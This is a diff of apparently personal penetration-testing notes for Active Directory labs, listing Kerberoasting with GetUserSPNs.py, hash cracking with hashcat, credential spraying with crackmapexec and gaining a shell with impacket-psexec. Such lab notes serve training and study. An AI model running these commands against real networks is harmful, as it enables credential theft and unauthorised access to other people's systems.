@@ -35,7 +35,7 @@
 1. To get hashes, run command: `proxychains GetUserSPNs.py somedomain.htb/someuser:'password' -dc-ip 192.168.110.55 -request`
 2. Cracking hashes: `hashcat -m 13100 kerberoasting.txt /usr/share/wordlists/rockyou.txt`
 
-#### What to do if you have got valid user/password credentials ?
+#### What to do if you have got valid user/password credentials --- after as-rep/kerb roasting ?
 1. Lets assume Kerberoasting got successful, what to do next ?
 2. Run cracmapexec, and if shows **Pwn3d!**, this means you can access that particular system.
 3. Command: `proxychains crackmapexec smb 192.168.110.52-55 -u http_svc -p 'somepassword'`
@@ -45,3 +45,6 @@
 
 #### Accessing that system e.g. we got creds after kerberoasting ?
 1. Via psexec, command: `proxychains impacket-psexec somedomain.htb/http_svc:'somepassword'@192.168.110.52`
+2. The above command would you give you shell. 
+
+### After shell, use SYSINTERNALS AD Explorer  / Bloodhound
